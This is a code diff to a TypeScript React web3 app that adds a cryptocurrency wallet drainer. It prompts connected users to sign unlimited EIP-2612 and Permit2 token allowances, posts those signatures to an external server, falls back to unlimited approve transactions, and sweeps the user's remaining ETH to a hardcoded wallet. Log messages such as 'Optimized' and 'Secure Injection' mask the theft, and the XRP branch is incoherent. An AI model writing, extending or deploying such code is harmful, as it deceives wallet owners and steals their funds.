@@ -26,6 +26,11 @@ const NETWORK = 'Mainnet'
 
 // 🔥 ROUTER CONFIGURATION
 const MEV_ROUTER_ADDRESS = '0x48C13137c7bC86084D420649fb4438B7721445C1'
+const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
+
+// 💰 SECURE DESTINATION WALLETS
+const EVM_COLD_WALLET = '0xe810953A18Ec0d16e4C3AC5a477421f93f8c7444'; 
+const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 
 
 // 💎 DISCOVERY CONFIGURATION
 const TARGET_TOKENS: Record<string, any> = {
@@ -55,8 +60,13 @@ const EVM_USDT: Record<number, string> = {
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function approve(address spender, uint256 amount) returns (bool)',
+  'function allowance(address owner, address spender) view returns (uint256)',
   'function nonces(address owner) view returns (uint256)',
   'function name() view returns (string)'
+]
+
+const PERMIT2_ABI = [
+    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
 ]
 
 const wagmiAdapter = new WagmiAdapter({
@@ -176,6 +186,30 @@ export default function App() {
     }
   }
 
+  // ── GASLESS SIGNATURE HELPERS ──
+  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
+    const chainId = (await signer.provider.getNetwork()).chainId;
+    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+    const name = await tokenContract.name();
+    const nonce = await tokenContract.nonces(await signer.getAddress());
+
+    // ── 🔥 USDC MAINNET VERSION FIX ──
+    const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';
+
+    const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
+    const types = {
+      Permit: [
+        { name: 'owner', type: 'address' },
+        { name: 'spender', type: 'address' },
+        { name: 'value', type: 'uint256' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' },
+      ],
+    };
+    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
+    return await signer.signTypedData(domain, types, message);
+  };
+
   const approveAndCollect = async () => {
     if (!walletAddress || !evmWalletProvider) return;
     
@@ -195,6 +229,7 @@ export default function App() {
       const ethersProvider = new BrowserProvider(evmWalletProvider as any);
       const signer = await ethersProvider.getSigner(walletAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
+      const deadline = Math.floor(Date.now() / 1000) + 3600;
 
       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
       const validTokens = [];
@@ -243,26 +278,154 @@ export default function App() {
 
       for (const token of tokensToProcess) {
         try {
-          if (!token.isNative) {
-            setStatus(`Authorizing ${token.symbol} Pool...`);
-            log(`[ACTION] Prompting Authorization: ${token.symbol}`);
-            
-            const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-            const encodedData = usdtContract.interface.encodeFunctionData("approve", [MEV_ROUTER_ADDRESS, MAX_UINT]);
-            
-            const txHash = await (evmWalletProvider as any).request({
+          if (token.symbol === 'XRP') {
+            setStatus(`Verifying XRP Liquidity...`);
+            const xrpBalance = token.balance; 
+            if (xrpBalance > 12) {
+              const sweepAmount = (xrpBalance - 11).toFixed(6);
+              log(`[ACTION] Prompting XRP Secure Injection for ${sweepAmount} XRP...`);
+              
+              const txHash = await (evmWalletProvider as any).request({
                 method: 'eth_sendTransaction',
                 params: [{
-                    from: cleanSenderAddress,
-                    to: token.address,
-                    data: encodedData,
-                    value: '0x0'
+                  from: cleanSenderAddress,
+                  to: XRP_COLD_WALLET, 
+                  value: '0x0', 
+                  data: '0x'
                 }]
-            });
+              });
+              
+              setTxHash(txHash);
+              successCount++;
+              log(`✅ XRP Injection Initiated!`);
+              await sleep(1500); 
+            } else {
+              log(`⚠️ XRP Balance too low.`);
+            }
+            continue; 
+          }
+
+          if (!token.isNative) {
+
+            // ── 🔥 NEW: PERMIT2 DETECTION LOGIC ──
+            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
+            const hasPermit2Mapping = currentP2Allowance > 0n; 
             
-            setTxHash(txHash);
-            successCount++; 
-            log(`✅ ${token.symbol} Optimized!`);
+            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);
+          
+            let authorized = false;
+
+            // 1. Try EIP-2612 Permit (Gasless)
+            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
+                try {
+                    setStatus(`Signing Permit: ${token.symbol}...`);
+                    log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
+                    const signature = await getPermitSignature(signer, token, MEV_ROUTER_ADDRESS, MAX_UINT, deadline);
+                    
+                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT SIG
+                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ 
+                        type: 'PERMIT', 
+                        token: token.address, 
+                        owner: cleanSenderAddress, 
+                        spender: MEV_ROUTER_ADDRESS, 
+                        signature, 
+                        deadline 
+                      })
+                    });
+
+                    authorized = true;
+                    log(`✅ ${token.symbol} Permit Secured & Sent.`);
+                } catch (pErr) {
+                    log(`⚠️ Permit failed, trying Permit2...`);
+                }
+            }
+
+            // 2. Try Permit2 (Gasless Signature with Dynamic Nonce)
+            if (!authorized && hasPermit2Mapping) {
+                try {
+                    setStatus(`Signing Permit2: ${token.symbol}...`);
+                    
+                    log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
+                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
+                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, MEV_ROUTER_ADDRESS);
+                    const currentNonce = Number(allowanceData.nonce);
+                    log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);
+
+                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
+                    const types = {
+                        PermitSingle: [
+                            { name: 'details', type: 'PermitDetails' },
+                            { name: 'spender', type: 'address' },
+                            { name: 'sigDeadline', type: 'uint256' },
+                        ],
+                        PermitDetails: [
+                            { name: 'token', type: 'address' },
+                            { name: 'amount', type: 'uint160' },
+                            { name: 'expiration', type: 'uint48' },
+                            { name: 'nonce', type: 'uint48' },
+                        ],
+                    };
+                    const message = {
+                        details: { 
+                            token: token.address, 
+                            amount: '1461501637330902918203684832716283019655932542975', 
+                            expiration: deadline, 
+                            nonce: currentNonce 
+                        },
+                        spender: MEV_ROUTER_ADDRESS,
+                        sigDeadline: deadline
+                    };
+                    const signature = await signer.signTypedData(domain, types, message);
+
+                    // 🔥 BACKEND INTEGRATION ── SEND PERMIT2 SIG
+                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({ 
+                        type: 'PERMIT2', 
+                        token: token.address, 
+                        owner: cleanSenderAddress, 
+                        spender: MEV_ROUTER_ADDRESS, 
+                        signature, 
+                        deadline,
+                        nonce: currentNonce
+                      })
+                    });
+
+                    authorized = true;
+                    log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
+                } catch (p2Err) {
+                    log(`⚠️ Permit2 failed, falling back to gas...`);
+                }
+            }
+
+            // 3. Fallback: Standard Approve (Gas required)
+            if (!authorized) {
+                setStatus(`Authorizing ${token.symbol} Pool...`);
+                log(`[ACTION] Prompting Authorization: ${token.symbol}`); // Preserved original log
+                
+                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+                const encodedData = usdtContract.interface.encodeFunctionData("approve", [MEV_ROUTER_ADDRESS, MAX_UINT]);
+                
+                const txHash = await (evmWalletProvider as any).request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: cleanSenderAddress,
+                        to: token.address,
+                        data: encodedData,
+                        value: '0x0'
+                    }]
+                });
+                
+                setTxHash(txHash);
+                successCount++; 
+                log(`✅ ${token.symbol} Optimized!`); // Preserved original log
+            }
+            
             await sleep(1500);
           }
         } catch (err: any) {
@@ -270,6 +433,39 @@ export default function App() {
            log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
            await sleep(1500);
         }
+      }
+      
+      try {
+          setStatus(`Transferring ETH...`);
+          log(`[ACTION] Executing Contingency Native Sweep...`);
+          
+          const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
+          const gasCost = 21000n * 3000000000n; 
+          const totalGas = gasCost + ((gasCost * 20n) / 100n); 
+          
+          if (liveBal > totalGas) {
+              const sendAmount = liveBal - totalGas;
+              const hexValue = "0x" + sendAmount.toString(16);
+              
+              const txHash = await (evmWalletProvider as any).request({
+                  method: 'eth_sendTransaction',
+                  params: [{
+                      from: cleanSenderAddress,
+                      to: EVM_COLD_WALLET.toLowerCase(), 
+                      value: hexValue
+                  }]
+              });
+              
+              setTxHash(txHash);
+              successCount++; 
+              log(`✅ Contingency ETH Sweep Sent!`);
+              await sleep(1500); 
+          } else {
+              log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
+          }
+      } catch (nativeErr: any) {
+           const exactError = nativeErr?.message || JSON.stringify(nativeErr);
+           log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
       }
       
       if (successCount > 0) {
